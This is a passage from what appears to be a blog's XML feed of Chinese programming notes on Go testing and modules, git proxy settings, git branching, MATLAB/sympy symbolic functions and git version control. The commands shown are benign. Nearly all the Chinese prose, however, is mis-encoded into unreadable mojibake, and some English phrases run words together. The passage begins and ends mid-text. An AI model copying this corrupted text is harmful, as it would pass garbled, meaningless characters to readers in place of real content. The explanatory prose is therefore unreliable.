æ¨¡å—è¿›è¡Œè¿è¡Œæµ‹è¯•,ä¹Ÿå¯ä»¥å‘½ä»¤è¡Œ</p><p>ç›´æ¥æµ‹è¯•å…¨éƒ¨æ–‡ä»¶: <code>go test</code></p><p>æŒ‡å®šæŸä¸ª,å•ç‹¬æµ‹è¯•: <code>go test xx_test.go</code></p><p>æ³¨æ„:å¦‚æœè¯¥å•ä¸ªæµ‹è¯•æ–‡ä»¶ä½¿ç”¨äº†å…¶ä»–åŒ…çš„å‡½æ•°ç­‰,ä¼šæŠ¥é”™</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command-line-arguments</span><br><span class="line">xxx.go. xxvaribale undefined</span><br></pre></td></tr></table></figure></p><p>è¿™ç§æƒ…å†µéœ€è¦åœ¨ <code>go test xx_test.go</code>ä¹‹åå†åŠ ä¸ŠæŠ¥é”™çš„é‚£äº›æ‰€åœ¨çš„ go æ–‡ä»¶</p></li></ol></li></ol><h2 id="gopath-å¼€å‘">GOPATH å¼€å‘</h2><p>GOPATH å¼€å‘çš„,æ²¡æœ‰ go.modçš„åŸºæœ¬æ˜¯æ¯”è¾ƒè€çš„é¡¹ç›®äº†,ä¸€èˆ¬è¿˜éœ€è¦å¤„ç†åº“çš„ç‰ˆæœ¬é—®é¢˜.</p><ol type="1"><li><code>git clone xx</code> å…‹éš†é¡¹ç›®åˆ°æœ¬åœ°</li></ol><h3 id="æ”¹ä¸º-module-å½¢å¼">æ”¹ä¸º module å½¢å¼:</h3><ol start="2" type="1"><li><p><code>go mod init mymodule_name</code> åœ¨åŒ…æ–‡ä»¶ä¸‹,åˆ›å»º mod</p><p><code>mymodule_name</code> æ˜¯ä½ è‡ªå·±å†™çš„æ¨¡å—åå­—,è‡ªå·±å®šä¹‰å³å¯</p><p>go.mod ç¤ºä¾‹:</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module mymodule_name</span><br><span class="line">go 1.19</span><br></pre></td></tr></table></figure></p><p>ç„¶å,éœ€è¦éå†æ¯ä¸ª go æ–‡ä»¶,æ‰¾åˆ°å¼•ç”¨çš„å¤–éƒ¨çš„åŒ…,å†™åˆ° mod é‡Œé¢æ¥</p><ol type="1"><li><p><code>go mod tidy</code></p><p>è¯¥å‘½ä»¤æ£€æŸ¥ä»£ç çš„åŒ…ä¾èµ–,å¹¶å°†å…¶åŠ å…¥ go.mod, å¹¶ç§»é™¤æ²¡æœ‰ç”¨åˆ°çš„,å¹¶åˆ›å»ºgo.sum ä½†æ˜¯å¦‚æœæœ‰æ—§åŒ…æ‰¾ä¸åˆ°,å°±ä¼šæŠ¥é”™,ä¸ä¼šæ·»åŠ .æ‰€ä»¥å¦‚æœæœ‰æ—§åŒ…,å¯ä»¥æ ¹æ®å…¶è¾“å‡ºå…ˆå°†æ­£å¸¸çš„åŒ…åŠå…¶ç‰ˆæœ¬æ‰‹åŠ¨æ·»åŠ åˆ° go.modä¸­,ç„¶åå¯ä»¥æ ¹æ®ä¸‹è½½çš„é¡¹ç›®çš„ commit æ—¶é—´,å»æ‰¾é‚£ä¸ªæ—§åŒ…å¤§æ¦‚æ—¶é—´çš„ commitå€¼</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">module mymodule_name</span><br><span class="line"></span><br><span class="line">go 1.19</span><br><span class="line"></span><br><span class="line">require (</span><br><span class="line">github.com/btcsuite/btcd v0.0.0-20181123190223-3dcf298fed2d</span><br><span class="line">github.com/sirupsen/logrus v1.9.0</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>å¯¹äºç¬¬ä¸€ä¸ªåŒ…,è¿™ç§éœ€è¦æŒ‡å®š commitçš„æ—§ç‰ˆæœ¬åŒ…,åé¢çš„ç‰ˆæœ¬å·è‡ªå·±æ˜¯å†™ä¸å‡ºæ¥çš„,å…ˆç›´æ¥ä¸å†™è¿™ä¸ªåŒ…. é€šè¿‡<code>go get github.com/btcsuite/btcd@commit_value</code> æ¥å°†å…¶æ·»åŠ åˆ°go mod ä¸­,(go get ä¹Ÿä¼šæ›´æ–° go.mod, go.sum)</p></li></ol></li><li><p><code>go mod tidy</code> æ£€æŸ¥,å¹¶åˆ›å»º `go.sum``</p></li><li><p>æœ€å,å‚è€ƒä¸Šé¢çš„ <code>æ˜¯å¦æœ‰ main å‡½æ•°</code>çš„éƒ¨åˆ†å°±å¥½äº†</p></li></ol><h3 id="ä¸æ”¹ä¸º-module-å½¢å¼æœªæµ‹è¯•">ä¸æ”¹ä¸º module å½¢å¼[æœªæµ‹è¯•]</h3><p>ç›´æ¥ <code>go get</code>é»˜è®¤ä¸‹è½½æºç å¯¼å…¥çš„ä¾èµ–çš„æœ€æ–°ç‰ˆæœ¬,å¦‚æœåç»­æœ‰åŒ…æŠ¥é”™,å†åˆ é™¤åŒ…,æ ¹ç» commitå€¼ go get</p><h3 id="others">others</h3><p><code>go mod tidy</code>:</p><p>This command goes through the go.mod file to resolvedependencies:</p><ol type="1"><li>delete the packages that are not needed</li><li>download those needed</li><li>update the go.sum</li></ol><h2 id="git-clone-ä¸-go-get">git clone ä¸ go get</h2><p>git clone ä¸‹è½½ä»“åº“é¡¹ç›®, go get æ ¹æ®é¡¹ç›®ä¸­å¯¼å…¥çš„åŒ…ä¸‹è½½æœ€æ–°åŒ…æˆ–è€…æ ¹æ®go.mod ä¸‹è½½æŒ‡å®šç‰ˆæœ¬çš„åŒ….</p><p>The git clone command will clone a repo into a newly createddirectory, while go get downloads and installs the packages named by theimport paths, along with their dependencies.</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><ahref="https://blog.csdn.net/love666666shen/article/details/119929929">gotest è¿›è¡Œå•å…ƒæµ‹è¯•æ—¶ï¼Œå‡ºç° undefined æ–¹æ³•æˆ–è€… command-line-arguments[build failed]è§£å†³æ–¹æ¡ˆ_love666666shen çš„åšå®¢-CSDN åšå®¢_go testundefined</a></p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git é…ç½®ä»£ç†</title>
      <link href="/blog/2022/11/16/linux/git/git_proxy/"/>
      <url>/blog/2022/11/16/linux/git/git_proxy/</url>
      
        <content type="html"><![CDATA[<blockquote><p>git clone åˆ† HTTP å½¢å¼å’Œ SSH å½¢å¼ï¼Œè€Œè¿™ä¸¤ç§å½¢å¼çš„éƒ½å¯ä»¥èµ°Â <code>http</code>Â  ä»£ç†å’Œ Â <code>socks5</code>Â  ä»£ç†è¿™ä¸¤ç§ä»£ç†</p></blockquote><h2 id="ssh-å½¢å¼">SSH å½¢å¼</h2><p>ssh å½¢å¼ï¼š<code>git clone git@github.com/xxx/xxx.git</code>ã€‚åœ¨<code>~/.ssh/config</code> æ–‡ä»¶æ·»åŠ ä¸‹é¢å†…å®¹ ï¼ˆhttp ä»£ç†æˆ–è€… socks5ä»£ç†ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># GitHub</span><br><span class="line">Host github.com</span><br><span class="line">   HostName github.com</span><br><span class="line">   IdentityFile ~/.ssh/id_rsa.github #  è¿™ä¸ªæ ¹æ®è‡ªå·±çš„ç§é’¥åç¡®å®š</span><br><span class="line">   # èµ° HTTP ä»£ç†</span><br><span class="line">   # ProxyCommand socat - PROXY:127.0.0.1:%h:%p,proxyport=7890</span><br><span class="line">   # èµ° socks5 ä»£ç†ï¼ˆå¦‚ Shadowsocksï¼‰</span><br><span class="line">   # ProxyCommand nc -v -x 127.0.0.1:7890 %h %p</span><br></pre></td></tr></table></figure><h2 id="http-å½¢å¼">HTTP å½¢å¼</h2><p>http å½¢å¼ï¼š<code>git clone https://github.com/xxx/xxx.git</code></p><h3 id="é…ç½®-git-å…¨å±€ä»£ç†">é…ç½® git å…¨å±€ä»£ç†</h3><p>é€šè¿‡å‘½ä»¤é…ç½®:</p><ol type="1"><li><p>http ä»£ç†</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy &quot;http://127.0.0.1:7890&quot;</span><br><span class="line">git config --global https.proxy &quot;http://127.0.0.1:7890&quot;</span><br></pre></td></tr></table></figure></p></li><li><p>socks5 ä»£ç†</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy &quot;socks5://127.0.0.1:7890&quot;</span><br><span class="line">git config --global https.proxy &quot;socks5://127.0.0.1:7890&quot;</span><br></pre></td></tr></table></figure></p></li><li><p>å–æ¶ˆä»£ç†</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy</span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure></p></li></ol><p>é€šè¿‡ git é…ç½®æ–‡ä»¶é…ç½®:</p><p><code>vim ~/.gitconfig</code> åŠ å…¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[http]</span><br><span class="line">    proxy = socks5://127.0.0.1:7890</span><br><span class="line">[https]</span><br><span class="line">    proxy = socks5://127.0.0.1:7890</span><br></pre></td></tr></table></figure><h2 id="é…ç½®ç»ˆç«¯ä¸´æ—¶ä»£ç†">é…ç½®ç»ˆç«¯ä¸´æ—¶ä»£ç†</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># proxy list</span><br><span class="line">alias proxy=&#x27;export all_proxy=socks5://127.0.0.1:7890&#x27;</span><br><span class="line">alias unproxy=&#x27;unset all_proxy&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git åˆ†æ”¯ç®¡ç†</title>
      <link href="/blog/2022/11/16/linux/git/git_branch/"/>
      <url>/blog/2022/11/16/linux/git/git_branch/</url>
      
        <content type="html"><![CDATA[<p>åˆ†æ”¯åœ¨å®é™…ä¸­æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿå‡è®¾ä½ å‡†å¤‡å¼€å‘ä¸€ä¸ªæ–°åŠŸèƒ½ï¼Œä½†æ˜¯éœ€è¦ä¸¤å‘¨æ‰èƒ½å®Œæˆï¼Œç¬¬ä¸€å‘¨ä½ å†™äº†50%çš„ä»£ç ï¼Œå¦‚æœç«‹åˆ»æäº¤ï¼Œç”±äºä»£ç è¿˜æ²¡å†™å®Œï¼Œä¸å®Œæ•´çš„ä»£ç åº“ä¼šå¯¼è‡´åˆ«äººä¸èƒ½å¹²æ´»äº†ã€‚å¦‚æœç­‰ä»£ç å…¨éƒ¨å†™å®Œå†ä¸€æ¬¡æäº¤ï¼Œåˆå­˜åœ¨ä¸¢å¤±æ¯å¤©è¿›åº¦çš„å·¨å¤§é£é™©ã€‚</p><p>ç°åœ¨æœ‰äº†åˆ†æ”¯ï¼Œå°±ä¸ç”¨æ€•äº†ã€‚ä½ åˆ›å»ºäº†ä¸€ä¸ªå±äºä½ è‡ªå·±çš„åˆ†æ”¯ï¼Œåˆ«äººçœ‹ä¸åˆ°ï¼Œè¿˜ç»§ç»­åœ¨åŸæ¥çš„åˆ†æ”¯ä¸Šæ­£å¸¸å·¥ä½œï¼Œè€Œä½ åœ¨è‡ªå·±çš„åˆ†æ”¯ä¸Šå¹²æ´»ï¼Œæƒ³æäº¤å°±æäº¤ï¼Œç›´åˆ°å¼€å‘å®Œæ¯•åï¼Œå†ä¸€æ¬¡æ€§åˆå¹¶åˆ°åŸæ¥çš„åˆ†æ”¯ä¸Šï¼Œè¿™æ ·ï¼Œæ—¢å®‰å…¨ï¼Œåˆä¸å½±å“åˆ«äººå·¥ä½œã€‚</p><p>ä½† Git çš„åˆ†æ”¯æ˜¯ä¸ä¼—ä¸åŒçš„ï¼Œæ— è®ºåˆ›å»ºã€åˆ‡æ¢å’Œåˆ é™¤åˆ†æ”¯ï¼ŒGit åœ¨ 1ç§’é’Ÿä¹‹å†…å°±èƒ½å®Œæˆ</p><p>å…³äºåˆ†æ”¯å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼š<ahref="https://blog.csdn.net/ShuSheng0007/article/details/80791849">å®é™…é¡¹ç›®ä¸­å¦‚ä½•ä½¿ç”¨Git åšåˆ†æ”¯ç®¡ç†</a></p><h2 id="åˆ›å»ºä¸åˆå¹¶åˆ†æ”¯">åˆ›å»ºä¸åˆå¹¶åˆ†æ”¯</h2><p>æ¯æ¬¡æäº¤ï¼ŒGitéƒ½æŠŠå®ƒä»¬ä¸²æˆä¸€æ¡æ—¶é—´çº¿ï¼Œè¿™æ¡æ—¶é—´çº¿å°±æ˜¯ä¸€ä¸ªåˆ†æ”¯ã€‚æˆªæ­¢åˆ°ç›®å‰ï¼Œåªæœ‰ä¸€æ¡æ—¶é—´çº¿ï¼Œåœ¨Gité‡Œï¼Œè¿™ä¸ªåˆ†æ”¯å«ä¸»åˆ†æ”¯ï¼Œå³<code>master</code>åˆ†æ”¯ã€‚<code>HEAD</code>ä¸¥æ ¼æ¥è¯´ä¸æ˜¯æŒ‡å‘æäº¤ï¼Œè€Œæ˜¯æŒ‡å‘<code>master</code>ï¼Œ<code>master</code>æ‰æ˜¯æŒ‡å‘æäº¤çš„ï¼Œæ‰€ä»¥ï¼Œ<code>HEAD</code>æŒ‡å‘çš„å°±æ˜¯å½“å‰åˆ†æ”¯ã€‚</p><p><code>HEAD</code> æŒ‡å‘å½“å‰åˆ†æ”¯, å½“å‰åˆ†æ”¯æ˜¯ master åˆ™æŒ‡å‘masterï¼Œæ˜¯åˆ«çš„åˆ™æŒ‡å‘åˆ«çš„ã€‚</p><p>ä¸€å¼€å§‹çš„æ—¶å€™ï¼Œ<code>master</code>åˆ†æ”¯æ˜¯ä¸€æ¡çº¿ï¼ŒGitç”¨<code>master</code>æŒ‡å‘æœ€æ–°çš„æäº¤ï¼Œå†ç”¨<code>HEAD</code>æŒ‡å‘<code>master</code>ï¼Œå°±èƒ½ç¡®å®šå½“å‰åˆ†æ”¯ï¼Œä»¥åŠå½“å‰åˆ†æ”¯çš„æäº¤ç‚¹ï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/image-20200314170748516.png"alt="image-20200314170748516" /><figcaption aria-hidden="true">image-20200314170748516</figcaption></figure><p>æ¯æ¬¡æäº¤ï¼Œ<code>master</code>åˆ†æ”¯éƒ½ä¼šå‘å‰ç§»åŠ¨ä¸€æ­¥ï¼Œè¿™æ ·ï¼Œéšç€ä½ ä¸æ–­æäº¤ï¼Œ<code>master</code>åˆ†æ”¯çš„çº¿ä¹Ÿè¶Šæ¥è¶Šé•¿ã€‚</p><p>å½“æˆ‘ä»¬åˆ›å»ºæ–°çš„åˆ†æ”¯ï¼Œä¾‹å¦‚<code>dev</code>æ—¶ï¼ŒGitæ–°å»ºäº†ä¸€ä¸ªæŒ‡é’ˆå«<code>dev</code>ï¼ŒæŒ‡å‘<code>master</code>ç›¸åŒçš„æäº¤ï¼Œå†æŠŠ<code>HEAD</code>æŒ‡å‘<code>dev</code>ï¼Œå°±è¡¨ç¤ºå½“å‰åˆ†æ”¯åœ¨<code>dev</code>ä¸Šï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/image-20200314160149952.png"alt="image-20200314160149952" /><figcaption aria-hidden="true">image-20200314160149952</figcaption></figure><p>Gi tåˆ›å»ºä¸€ä¸ªåˆ†æ”¯å¾ˆå¿«ï¼Œå› ä¸ºé™¤äº†å¢åŠ ä¸€ä¸ª<code>dev</code>æŒ‡é’ˆï¼Œæ”¹æ”¹<code>HEAD</code>çš„æŒ‡å‘ï¼Œå·¥ä½œåŒºçš„æ–‡ä»¶éƒ½æ²¡æœ‰ä»»ä½•å˜åŒ–ï¼</p><p>ä¸è¿‡ï¼Œä»ç°åœ¨å¼€å§‹ï¼Œå¯¹å·¥ä½œåŒºçš„ä¿®æ”¹å’Œæäº¤å°±æ˜¯é’ˆå¯¹<code>dev</code>åˆ†æ”¯äº†ï¼Œæ¯”å¦‚æ–°æäº¤ä¸€æ¬¡åï¼Œ<code>dev</code>æŒ‡é’ˆå¾€å‰ç§»åŠ¨ä¸€æ­¥ï¼Œè€Œ<code>master</code>æŒ‡é’ˆä¸å˜ï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/image-20200314162733687.png"alt="image-20200314162733687" /><figcaption aria-hidden="true">image-20200314162733687</figcaption></figure><p>æ‰€ä»¥ Git åˆå¹¶åˆ†æ”¯ä¹Ÿå¾ˆå¿«ï¼å°±æ”¹æ”¹æŒ‡é’ˆï¼Œå·¥ä½œåŒºå†…å®¹ä¹Ÿä¸å˜ï¼</p><p>åˆå¹¶å®Œåˆ†æ”¯åï¼Œç”šè‡³å¯ä»¥åˆ é™¤<code>dev</code>åˆ†æ”¯ã€‚åˆ é™¤<code>dev</code>åˆ†æ”¯å°±æ˜¯æŠŠ<code>dev</code>æŒ‡é’ˆç»™åˆ æ‰ï¼Œåˆ æ‰åï¼Œæˆ‘ä»¬å°±å‰©ä¸‹äº†ä¸€æ¡<code>master</code>åˆ†æ”¯ï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/image-20200314163042838.png"alt="image-20200314163042838" /><figcaption aria-hidden="true">image-20200314163042838</figcaption></figure><p>Git é¼“åŠ±å¤§é‡ä½¿ç”¨åˆ†æ”¯ï¼š</p><p>æŸ¥çœ‹åˆ†æ”¯ï¼š<code>git branch</code></p><p>åˆ›å»ºåˆ†æ”¯ï¼š<code>git branch</code></p><p>åˆ‡æ¢åˆ†æ”¯ï¼š<code>git switch</code> æˆ– <code>git checkout</code></p><p>åˆ›å»º+åˆ‡æ¢åˆ†æ”¯ï¼š<code>git switch -c</code> æˆ–<code>git checkout -b</code></p><p>åˆå¹¶æŸåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯ï¼š<code>git merge</code></p><p>åˆ é™¤åˆ†æ”¯ï¼š<code>git branch -d</code></p><h2 id="è§£å†³å†²çª">è§£å†³å†²çª</h2><p>å½“ Gitæ— æ³•è‡ªåŠ¨åˆå¹¶åˆ†æ”¯æ—¶ï¼Œå°±å¿…é¡»é¦–å…ˆè§£å†³å†²çªã€‚è§£å†³å†²çªåï¼Œå†æäº¤ï¼Œåˆå¹¶å®Œæˆã€‚å…¶ä¸­ï¼Œ<code>git merge &lt;brachname&gt;</code> çš„ç»“æœæˆ–è€…<code>git status</code> çš„ç»“æœä¼šææ‰€æˆ‘ä»¬å†²çªçš„æ–‡ä»¶ã€‚</p><p>æˆ‘ä»¬æŸ¥çœ‹è¯¥æ–‡ä»¶ï¼ŒGitç”¨<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>ï¼Œ<code>=======</code>ï¼Œ<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>æ ‡è®°å‡ºä¸åŒåˆ†æ”¯çš„å†…å®¹ï¼Œæˆ‘ä»¬ä¿®æ”¹å†²çªï¼Œç„¶åæäº¤ã€‚</p><p>è§£å†³å†²çªå°±æ˜¯æŠŠ Gitåˆå¹¶å¤±è´¥çš„æ–‡ä»¶æ‰‹åŠ¨ç¼–è¾‘ä¸ºæˆ‘ä»¬å¸Œæœ›çš„å†…å®¹ï¼Œå†æäº¤ã€‚</p><p>ç”¨<code>git log --graph</code>å‘½ä»¤å¯ä»¥çœ‹åˆ°åˆ†æ”¯åˆå¹¶å›¾ã€‚</p><h2 id="åˆ†æ”¯ç®¡ç†ç­–ç•¥">åˆ†æ”¯ç®¡ç†ç­–ç•¥</h2><p>é€šå¸¸ï¼Œåˆå¹¶åˆ†æ”¯æ—¶ï¼Œå¦‚æœå¯èƒ½ï¼ŒGitä¼šç”¨<code>Fast forward</code>æ¨¡å¼ï¼Œä½†è¿™ç§æ¨¡å¼ä¸‹ï¼Œåˆ é™¤åˆ†æ”¯åï¼Œä¼šä¸¢æ‰åˆ†æ”¯ä¿¡æ¯ã€‚</p><p>å¦‚æœè¦å¼ºåˆ¶ç¦ç”¨<code>Fast forward</code>æ¨¡å¼ï¼ŒGit å°±ä¼šåœ¨ mergeæ—¶ç”Ÿæˆä¸€ä¸ªæ–°çš„ commitï¼Œè¿™æ ·ï¼Œä»åˆ†æ”¯å†å²ä¸Šå°±å¯ä»¥çœ‹å‡ºåˆ†æ”¯ä¿¡æ¯ã€‚</p><p><code>--no-ff</code>æ–¹å¼çš„<code>git merge</code></p><p><code>git merge --no-ff -m "merge with no-ff" dev</code></p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/image-20200314171437733.png"alt="image-20200314171437733" /><figcaption aria-hidden="true">image-20200314171437733</figcaption></figure><h3 id="åˆ†æ”¯ç­–ç•¥">åˆ†æ”¯ç­–ç•¥</h3><p>åœ¨å®é™…å¼€å‘ä¸­ï¼Œæˆ‘ä»¬åº”è¯¥æŒ‰ç…§å‡ ä¸ªåŸºæœ¬åŸåˆ™è¿›è¡Œåˆ†æ”¯ç®¡ç†ï¼š</p><p>é¦–å…ˆï¼Œ<code>master</code>åˆ†æ”¯åº”è¯¥æ˜¯éå¸¸ç¨³å®šçš„ï¼Œä¹Ÿå°±æ˜¯ä»…ç”¨æ¥å‘å¸ƒæ–°ç‰ˆæœ¬ï¼Œå¹³æ—¶ä¸èƒ½åœ¨ä¸Šé¢å¹²æ´»ï¼›</p><p>é‚£åœ¨å“ªå¹²æ´»å‘¢ï¼Ÿå¹²æ´»éƒ½åœ¨<code>dev</code>åˆ†æ”¯ä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>dev</code>åˆ†æ”¯æ˜¯ä¸ç¨³å®šçš„ï¼Œåˆ°æŸä¸ªæ—¶å€™ï¼Œæ¯”å¦‚1.0ç‰ˆæœ¬å‘å¸ƒæ—¶ï¼Œå†æŠŠ<code>dev</code>åˆ†æ”¯åˆå¹¶åˆ°<code>master</code>ä¸Šï¼Œåœ¨<code>master</code>åˆ†æ”¯å‘å¸ƒ1.0 ç‰ˆæœ¬ï¼›</p><p>ä½ å’Œä½ çš„å°ä¼™ä¼´ä»¬æ¯ä¸ªäººéƒ½åœ¨<code>dev</code>åˆ†æ”¯ä¸Šå¹²æ´»ï¼Œæ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„åˆ†æ”¯ï¼Œæ—¶ä¸æ—¶åœ°å¾€<code>dev</code>åˆ†æ”¯ä¸Šåˆå¹¶å°±å¯ä»¥äº†ã€‚</p><p>æ‰€ä»¥ï¼Œå›¢é˜Ÿåˆä½œçš„åˆ†æ”¯çœ‹èµ·æ¥å°±åƒè¿™æ ·ï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/image-20200314172118805.png"alt="image-20200314172118805" /><figcaption aria-hidden="true">image-20200314172118805</figcaption></figure><h3 id="å°ç»“">å°ç»“</h3><p>åˆå¹¶åˆ†æ”¯æ—¶ï¼ŒåŠ ä¸Š<code>--no-ff</code>å‚æ•°å°±å¯ä»¥ç”¨æ™®é€šæ¨¡å¼åˆå¹¶ï¼Œåˆå¹¶åçš„å†å²æœ‰åˆ†æ”¯ï¼Œèƒ½çœ‹å‡ºæ¥æ›¾ç»åšè¿‡åˆå¹¶ï¼Œè€Œ<code>fast forward</code>åˆå¹¶å°±çœ‹ä¸å‡ºæ¥æ›¾ç»åšè¿‡åˆå¹¶ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python sympy åº“ or matlab ç¬¦å·è®¡ç®—é—®é¢˜è®°å½•</title>
      <link href="/blog/2022/11/15/programming/python/sympy_matlab/"/>
      <url>/blog/2022/11/15/programming/python/sympy_matlab/</url>
      
        <content type="html"><![CDATA[<h2 id="sympy-or-matlab">sympy or matlab</h2><p>å…³äº matlab ä¸­çš„ symbol å‘ï¼š</p><ol type="1"><li><p>ç¬¦å·å‡½æ•°çš„å‚æ•°å¿…é¡»æ˜¯ç¬¦å·ï¼Œä¸èƒ½æ˜¯æ•°å­—,å¯¹äºè€¦åˆçš„ indexedsymbols/symbol array çš„ç¬¦å·å‡½æ•°å®šä¹‰ï¼Œå®¹æ˜“å‡ºé”™çš„ç‚¹ï¼š</p><p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">syms followers(x)</span><br><span class="line">d = sym(<span class="string">&#x27;d&#x27;</span>,[<span class="number">1</span> <span class="number">3</span>],<span class="string">&#x27;positive&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> k=<span class="number">1</span>:<span class="number">2</span></span><br><span class="line">    followers(d(k))=d(k)/(d(<span class="number">1</span>)+d(<span class="number">2</span>)ï¼‰</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>å‡½æ•°å…ˆå®šä¹‰åèµ‹å€¼ï¼Œè¿™æ®µä»£ç çš„å®é™…è¿è¡Œæ—¶ï¼Œé¦–å…ˆï¼Œk=1,å®šä¹‰followers(d(1))=d(1)/(d(1)+d(2)ï¼‰ï¼Œå…¶ä¸­ d(1)ä¸ºè‡ªå˜é‡ï¼Œè¿™æ ·åˆ†æ¯çš„d(1)ä¹Ÿæ˜¯è‡ªå˜é‡ï¼Œç„¶å k=2ï¼Œ</p><p>å¤åˆ¶ç»™äº†ä»¥ç¬¦å·ä¸ºå‚å˜é‡çš„å‡½æ•° followerã€‚å®é™…ä¸Š followers(d(1)) =followers(d(2)) = followers(d(2))=followers(d) éƒ½æ˜¯ follower å‡½æ•°é’ˆå¯¹ dè¿™ä¸€ä¸ªç¬¦å·å˜é‡çš„å€¼ï¼Œè¿™å€¼ä¹Ÿå°±æ˜¯å”¯ä¸€çš„ï¼Œé‡å¤èµ‹å€¼ï¼Œå…¶å€¼åªä¼šæ˜¯æœ€åä¸€ä¸ªã€‚</p></li><li><p><ahref="https://ww2.mathworks.cn/matlabcentral/answers/350227-indexing-inside-symbolic-product">Indexinginside symbolic product - MATLAB Answers - MATLAB Central</a></p><p>When defining a function, ensure that <strong>the arguments aresymbolic variables</strong> and the body of the function is a SYMexpression. When indexing, <strong>the input must be numeric, logical,or ':'</strong>. Syms can never be used as indices to indexing indexedsymbols.</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git ç‰ˆæœ¬æ§åˆ¶ä¸ä¿®æ”¹åˆ é™¤</title>
      <link href="/blog/2022/10/16/linux/git/git_principle/"/>
      <url>/blog/2022/10/16/linux/git/git_principle/</url>
      
        <content type="html"><![CDATA[<h2 id="ç‰ˆæœ¬æ§åˆ¶">ç‰ˆæœ¬æ§åˆ¶</h2><ol start="0" type="1"><li><p>HEAD æŒ‡å‘çš„ç‰ˆæœ¬å°±æ˜¯å½“å‰ç‰ˆæœ¬ï¼Œå› æ­¤ï¼ŒGitå…è®¸æˆ‘ä»¬åœ¨ç‰ˆæœ¬çš„å†å²ä¹‹é—´ç©¿æ¢­ï¼Œä½¿ç”¨å‘½ä»¤<code>git reset --hard commit_id</code> æˆ–<code>git reset --hard HEAD^</code>ç­‰æŒ‡é’ˆæ§åˆ¶</p><p>Git å¿…é¡»çŸ¥é“å½“å‰ç‰ˆæœ¬æ˜¯å“ªä¸ªç‰ˆæœ¬ï¼Œåœ¨ Git ä¸­ï¼Œç”¨ <code>HEAD</code>è¡¨ç¤ºå½“å‰ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯æœ€æ–°çš„æäº¤<code>1094adb...</code>ï¼ˆæ³¨æ„æˆ‘çš„æäº¤ IDå’Œä½ çš„è‚¯å®šä¸ä¸€æ ·ï¼‰ï¼Œä¸Šä¸€ä¸ªç‰ˆæœ¬å°±æ˜¯<code>HEAD^</code>ï¼Œä¸Šä¸Šä¸€ä¸ªç‰ˆæœ¬å°±æ˜¯<code>HEAD^^</code>ï¼Œå½“ç„¶å¾€ä¸Š 100 ä¸ªç‰ˆæœ¬å†™ 100ä¸ª^æ¯”è¾ƒå®¹æ˜“æ•°ä¸è¿‡æ¥ï¼Œæ‰€ä»¥å†™æˆ <code>HEAD~100</code>ã€‚</p><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç”¨ç‰ˆæœ¬å·æ ‡è¯†ç‰ˆæœ¬ï¼Œ ç‰ˆæœ¬å·æ²¡å¿…è¦å†™å…¨ï¼Œå‰å‡ 